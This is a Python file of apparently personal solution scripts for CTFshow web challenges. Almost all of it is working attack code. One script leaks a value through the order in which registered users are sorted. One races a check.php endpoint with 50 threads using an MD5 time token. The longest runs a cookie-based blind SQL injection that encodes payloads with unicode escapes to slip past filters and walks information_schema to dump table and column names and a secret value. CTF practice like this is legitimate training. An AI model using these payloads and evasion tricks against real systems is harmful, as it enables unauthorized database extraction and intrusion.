import time
import requests
import hashlib
import threading

############ CTFshow web1
def ctfshow_web_1():
    url = "http://89c66621-11ae-44e8-b3db-50854912a6bd.challenge.ctf.show"
    url1= url + "/reg.php" #注册页面
    url2= url + "/login.php"#登录界面
    url3= url + "/user_main.php?order=pwd" #查询界面
    currentStr=""
    key = 0
    s = "-.0123456789:abcdefghijklmnopqrstuvwxyz{}|~"
    for j in range(0,45):
        if (key == 1):
            break;
        print("*")
        for i in s:
            l = ""
            l = currentStr + i
            l2 = currentStr + chr(ord(i)-1)
            data = {'username':l,
                    'email':'c',
                    'nickname':'c',
                    'password':l
                    }
            data2 = {'username':l,
                      'password':l
                    }
            if (l=='flag'):
                currentStr='flag'
                print(currentStr)
                break
            session = requests.session()
            r1 = session.post(url1,data)
            time.sleep(0.1)
            r2 = session.post(url2,data)
            time.sleep(0.1)
            r3 = session.get(url3)
            t = r3.text
            if (t.index("<td>"+l+"</td>")>t.index("<td>flag@ctf.show</td>")):
                currentStr=l2
                print(currentStr)
                if(i=="~"):
                    key=1
                break
#ctfshow_web_1()


############ ctf.show_红包题第六弹
def ctf_show_hongbao_6():
    i = str(time.localtime().tm_min)
    m = hashlib.md5(i.encode()).hexdigest()
    url = "http://2625e7be-c378-47f3-a74a-7be2a8c153e0.challenge.ctf.show/check.php?token={}&php://input".format(m)

    def POST(data):
        try:
            r = requests.post(url,data=data)
            if "ctfshow" in r.text:
                print(r.text)
                pass
            pass
        except Exception as e:
            print("出错了")
            pass
        pass

    with open('./resource/key.dat','rb') as file:
        data1 = file.read()
        pass
    for i in range(50):
        threading.Thread(target=POST,args=(data1,)).start()
    for i in range(50):
        data2 = 'xixixix'
        threading.Thread(target=POST,args=(data2,)).start()
#ctf_show_hongbao_6()


############ CTFshow web15 Fishman
# 这道题改成了用group_concat, substr 一次性输出所有内容。
# 原来的between and 实际是找出字符两端，然后左端开始缩小，当缩到实际字符的时候，条件判断就是出错，这时候c-1就能找到实际字符。
def ctfshow_web15_Fishman():
    url = "http://9c61123a-7596-4f9a-b8ed-2897a567a8f4.challenge.ctf.show/admin/"

    def tamper(payload):
        payload = payload.lower()
        payload = payload.replace('u', '\\u0075')
        payload = payload.replace('\'', '\\u0027')
        payload = payload.replace('o', '\\u006f')
        payload = payload.replace('i', '\\u0069')
        payload = payload.replace('"', '\\u0022')
        payload = payload.replace(' ', '\\u0020')
        payload = payload.replace('s', '\\u0073')
        payload = payload.replace('#', '\\u0023')
        payload = payload.replace('>', '\\u003e')
        payload = payload.replace('<', '\\u003c')
        payload = payload.replace('-', '\\u002d')
        payload = payload.replace('=', '\\u003d')
        payload = payload.replace('f1a9', 'F1a9')
        payload = payload.replace('f1', 'F1')
        return payload

    #get database length
    def databaseName_len():
        print ("start get database name length...")
        for l in range(0,45):
            payload = "1' or (length(database())=" + str(l+1) + ")#"
            payload = tamper(payload)
            tmpCookie = 'islogin=1;login_data={"admin_user":"%s","admin_pass":65}' % payload
            headers = {'cookie': tmpCookie}
            r =requests.get(url, headers=headers)
            myHeaders = str(r.raw.headers)
            if ((myHeaders.count("login_data") == 1)):
                print('get db length = ' + str(l).lower())
                break

    #get content
    def get_databaseName():
        flag = ''
        for j in range(0, 15):
            for c in range(0x20,0x7f):
                if chr(c) == '\'' or chr(c) == ';' or chr(c) == '\\' or chr(c) == '+':
                    continue
                else:
                    payload = "1' or (select (database()) between '" + flag + chr(c) + "' and '" +chr(126) + "')#"
                print(payload)
                payload = tamper(payload)
                tmpCookie = 'islogin=1;login_data={"admin_user":"%s","admin_pass":65}' % payload
                headers = {'cookie': tmpCookie}
                r =requests.get(url, headers=headers)
                myHeaders = str(r.raw.headers)
                if ((myHeaders.count("login_data") == 2)):
                    flag += chr(c - 1)
                    print('databasename = ' + flag.lower())
                    break

    #get content
    def get_tableName():
        flag = ''
        for j in range(30, 50):           #blind inject
            for c in range(0x20,0x7f):
                if chr(c) == '\'' or chr(c) == ';' or chr(c) == '\\' or chr(c) == '+':
                    continue
                else:
                    # fish_admin,fish_ip,fish_user,fl2333g
                    payload = "1' or (substr((select group_concat(table_name) from information_schema.tables where table_schema=database())," + str(j) + ",1) = '" + chr(c) + "')#"
                    #payload = "1' or (select (select table_name from information_schema.tables where table_schema=database() limit 3,1) between '" + flag + chr(c) + "' and '" +chr(126) + "')#"
                # print(payload)
                payload = tamper(payload)
                tmpCookie = 'islogin=1;login_data={"admin_user":"%s","admin_pass":65}' % payload
                headers = {'cookie': tmpCookie}
                r =requests.get(url, headers=headers)
                myHeaders = str(r.raw.headers)
                #print(myHeaders.count("login_data"))
                if ((myHeaders.count("login_data") == 1)):
                    flag += chr(c)
                    print('tablename = ' + flag.lower())
                    break

    #get content
    def get_ColumnName():
        flag = ''
        for j in range(0, 50):           #blind inject
            for c in range(0x20,0x7f):
                if chr(c) == '\'' or chr(c) == ';' or chr(c) == '\\' or chr(c) == '+':
                    continue
                else:
                    # flllllag
                    payload = "1' or (substr((select group_concat(column_name) from information_schema.columns where table_name='fl2333g')," + str(j) + ",1) = '" + chr(c) + "')#"
                    #payload = "1' or (select (select column_name from information_schema.columns where table_name='FL2333G' limit 0,1) between '" + flag + chr(c) + "' and '" +chr(126) + "')#"
                #print(payload)
                payload = tamper(payload)
                tmpCookie = 'islogin=1;login_data={"admin_user":"%s","admin_pass":65}' % payload
                headers = {'cookie': tmpCookie}
                r =requests.get(url, headers=headers)
                myHeaders = str(r.raw.headers)
                if ((myHeaders.count("login_data") == 1)):
                    flag += chr(c)
                    print('column name = ' + flag.lower())
                    break

    #get content
    def get_value():
        flag = ''
        for j in range(0, 50):           #blind inject
            for c in range(0x20,0x7f):
                if chr(c) == '\'' or chr(c) == ';' or chr(c) == '\\' or chr(c) == '+':
                    continue
                else:
                    payload = "1' or (substr((select flllllag from FL2333G)," + str(j) + ",1) = '" + chr(c) + "')#"
                    # payload = "1' or (select (select FLLLLLAG from FL2333G) between '" + flag + chr(c) + "' and '" +chr(126) + "')#"
                #print(payload)
                payload = tamper(payload)
                tmpCookie = 'islogin=1;login_data={"admin_user":"%s","admin_pass":65}' % payload
                headers = {'cookie': tmpCookie}
                r =requests.get(url, headers=headers)
                myHeaders = str(r.raw.headers)
                if ((myHeaders.count("login_data") == 1)):
                    flag += chr(c)
                    print('flag = ' + flag.lower())
                    break

    print ("start database sql injection...")
    databaseName_len()
    get_databaseName()
    get_tableName()
    get_ColumnName()
    get_value()
#ctfshow_web15_Fishman()
